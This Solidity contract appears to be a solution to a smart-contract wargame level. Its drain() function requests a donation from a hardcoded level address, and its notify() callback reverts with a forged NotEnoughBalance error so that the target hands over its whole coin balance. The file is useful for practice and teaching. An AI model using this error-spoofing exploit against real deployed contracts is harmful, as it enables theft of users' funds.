// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <0.9.0;

import "@openzeppelin/contracts/utils/Address.sol";

interface INotifyable {
    function notify(uint256 amount) external;
}

interface Coin {
    function balances(address) external pure returns (uint256);
}

contract GoodSamaritan is INotifyable {

    error NotEnoughBalance();

    address level = 0xb4722cfe9ac4b8815ADe6Ff3d299A3C26695308b;
    address coin = 0x734882F8f0a95D1063176fde5715357F6A8B657a;
    address player = 0xD64D08C68F6940281c51108734B5b5DA95f62BD5;
    event TestBool(bool);
    event TestUint(uint256);
    event TestAddr(address);
    
    function drain() external {

        bytes memory payload = abi.encodeWithSignature("requestDonation()");
        (bool success, ) = level.call(payload);
        emit TestBool(success);
    }

    function notify(uint256 amount) external pure {

        if(amount == 10) {
            revert NotEnoughBalance();
        }
    }
}